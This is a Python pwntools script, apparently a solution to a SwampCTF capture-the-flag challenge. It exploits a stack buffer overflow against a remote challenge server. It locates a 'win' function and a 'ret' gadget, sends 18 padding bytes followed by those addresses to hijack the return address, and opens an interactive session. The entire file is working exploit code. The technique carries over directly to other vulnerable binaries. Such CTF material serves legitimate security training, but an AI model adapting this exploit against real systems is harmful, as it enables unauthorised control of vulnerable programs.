from pwn import *

# Load the binary
binary = ELF("./binary")

# Start the process
#p = process("./binary")
p = remote("chals.swampctf.com", 40001)
#p = gdb.debug("./bin", "break main\nrun")
# Find the address of the win function
win_address = binary.symbols['win']
log.info(f"win function address: {hex(win_address)}")

# Determine offset to return address (found using a cyclic pattern and gdb)
offset = 18  # Adjust this based on actual binary analysis

ret_addr = next(binary.search(asm('ret'), executable = True))
log.info(f"Ret address {hex(ret_addr)}")


# Construct the payload
payload = b"A" * offset  # Fill up to the return address
payload += p64(ret_addr)
payload += p64(win_address)  # Overwrite return address with win function

# Send the payload
p.sendline(payload)


# Interact with the shell if needed
p.interactive()
